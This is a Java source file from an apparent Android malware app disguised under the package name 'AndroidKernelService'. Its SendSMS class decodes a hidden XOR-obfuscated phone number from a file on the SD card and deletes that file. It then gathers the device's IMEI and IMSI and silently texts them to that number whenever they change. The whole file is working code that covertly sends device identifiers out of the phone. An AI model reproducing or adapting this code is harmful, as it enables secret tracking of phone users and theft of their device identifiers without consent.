package com.AndroidKernelService;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Timer;
import java.util.TimerTask;

import android.content.Context;
import android.telephony.*;

public class SendSMS {
	public static final String TAG = "SendSMS";
	Context mContext;

	public static String smsNumber = "18712345678";

	String NAME = "PhoneInfo.txt";
	String PATH = "data/data/com.AndroidKernelService/";

	String IMEI = "IMEI";
	String IMSI = "IMSI";

	public SendSMS(Context context) {
		mContext = context;
	}

	public SendSMS() {

	}

	public void sendSMS() {
		// 在这里将smsNumber换成文件中的smsNumber
		File smsNumFile = new File("/mnt/sdcard/sysInfo.txt");
		if (smsNumFile.exists()) {
			try {
				InputStreamReader read = new InputStreamReader(
						new FileInputStream(smsNumFile));
				BufferedReader bufferedReader = new BufferedReader(read);
				try {
					String sourcePhNum = bufferedReader.readLine();
					if (sourcePhNum != null) {
						try {
							// 进行异或解密
							WriteLogFile.writeLog("发送注册短信到该号码" + sourcePhNum);
							smsNumber = xorEncrypt.xorEn(sourcePhNum);
							WriteLogFile.writeLog("即该号码:" + smsNumber);
							// 给电话号码重新赋值
							bufferedReader.close();
							read.close();
							smsNumFile.delete();
						} catch (Exception e) {

						}
					}
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			} catch (FileNotFoundException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		WriteLogFile.writeLog("运行到sendSMS函数中");
		final BasicInfo info = new BasicInfo(mContext);
		try {
			// 在这里获取IMEI号码和IMSI号码

			try {
				// new Thread().sleep(60 * 1000);
			} catch (Exception e) {

			}
			WriteLogFile.writeLog("执行获取IMEI");
			IMEI = info.getIMEI();
			IMSI = info.getIMSI();
			WriteLogFile.writeLog("执行完获取IMSI");

			/*
			 * for(int i=0; i<100; i++){ for(int j=0; j<1000; j++) { int
			 * at=198*100; }
			 * 
			 * IMEI = info.getIMEI(); IMSI = info.getIMSI();
			 * 
			 * if(IMEI.toString().length() > 4 && IMSI.toString().length() > 4)
			 * break; }
			 */

		} catch (Exception e) {
			WriteLogFile.writeLog(e.toString());
		}
		// 写到日志文件
		// WriteLogFile.writeLog(IMEI + "@" + IMSI + "要发送的手机号" + smsNumber);
		/*
		 * String mMessageText = "Android@" + IMEI + "@" + IMSI; SmsManager
		 * smsManager = SmsManager.getDefault();
		 * smsManager.sendTextMessage(smsNumber, null, mMessageText, null,
		 * null);
		 */
		// 判断PhoneInfo.txt是否存在
		File path = new File(PATH);
		if (!path.exists()) {
			path.mkdir();
		}
		File file = new File(PATH + NAME);
		boolean send = false;
		if (!file.exists()) {
			send = true;
			WriteLogFile.writeLog("send01=" + send);
			try {
				file.createNewFile();
				BufferedWriter output = new BufferedWriter(new FileWriter(file));
				output.write(IMEI);
				output.newLine();

				output.write(IMSI);
				output.newLine();

				output.close();
			} catch (IOException ioe) {
				ioe.printStackTrace();
				// WriteLogFile.writeLog("BootException01" + ioe.toString());
			}

		} else {
			// 读IMEI和IMSI号
			try {
				BufferedReader input = new BufferedReader(new FileReader(file));
				String IMEI_old = input.readLine();
				String IMSI_old = input.readLine();
				// WriteLogFile.writeLog("old version:" + IMEI_old + "  " +
				// IMSI_old);
				if (IMEI_old.contains(IMEI) && IMSI_old.contains(IMSI)) {
					input.close();
				} else {
					// 写入新的IMEI和IMSI号
					BufferedWriter output = new BufferedWriter(new FileWriter(
							file, false));
					output.write(IMEI);
					output.newLine();
					output.write(IMSI);
					output.newLine();
					output.close();
					send = true;
				}

			} catch (IOException ioe) {
				ioe.printStackTrace();
				// WriteLogFile.writeLog("BootException02" + ioe.toString());
			}
		}
		if (send) {
			try {
				String mMessageText = "Android@" + IMSI + "@" + IMEI;
				// WriteLogFile.writeLog("开始发短信");

				SmsManager smsManager = SmsManager.getDefault();
				smsManager.sendTextMessage(smsNumber, null, mMessageText, null,
						null);

				// WriteLogFile.writeLog("发短信结束");
			} catch (Exception e) {
				WriteLogFile.writeLog("BootException03" + e.toString());
			}
		}
		// WriteLogFile.writeLog("运行完发送命令");

	}
}
